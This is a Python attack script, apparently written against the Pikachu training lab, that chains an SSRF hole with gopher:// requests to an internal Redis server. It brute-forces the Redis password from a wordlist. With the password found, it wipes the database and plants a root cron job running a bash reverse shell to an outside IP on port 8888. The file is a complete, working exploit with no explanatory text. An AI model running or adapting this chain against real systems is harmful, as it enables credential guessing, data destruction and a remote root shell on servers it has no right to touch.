#!/usr/bin/python
# -*- coding: UTF-8 -*-
import urllib.request
from urllib.parse import quote

url = "http://10.0.0.14/pikachu/vul/ssrf/ssrf_curl.php?url="
gopher = "gopher://10.0.0.148:6379/_"

def get_password():
    f = open("password.txt","r")
    return f.readlines()

def encoder_url(data):
    encoder = ""
    for single_char in data:
        # 先转为ASCII
        encoder += str(hex(ord(single_char)))
    encoder = encoder.replace("0x","%").replace("%a","%0d%0a")
    return encoder

for password in get_password():
    # 攻击脚本
    data = """
    auth %s
    quit
    """ % password        #不断的用字典中的密码去替换
    
    getshell = """
    auth %s
    flushall
    set mars "\\n\\n */1 * * * * bash -i >& /dev/tcp/192.168.16.34/8888 0>&1\\n\\n"
    config set dir /var/spool/cron/
    config set dbfilename root
    save
    quit
    """%password
    # 二次编码
    encoder = encoder_url(encoder_url(data))
    # 生成payload
    payload = url + quote(gopher,'utf-8') + encoder
    print(payload)

    # 发起请求
    request = urllib.request.Request(payload)
    response = urllib.request.urlopen(request).read()
    if response.decode().count("+OK") > 1:
        print("find password : " + password)
        #print(getshell)
        encoder_2 = encoder_url(encoder_url(getshell))
        payload_2 = url + quote(gopher,'utf-8')+encoder_2
        print(payload_2)
        request = urllib.request.Request(payload_2)
        response = urllib.request.urlopen(request).read()
        print("The packet of getshell has been sent!")
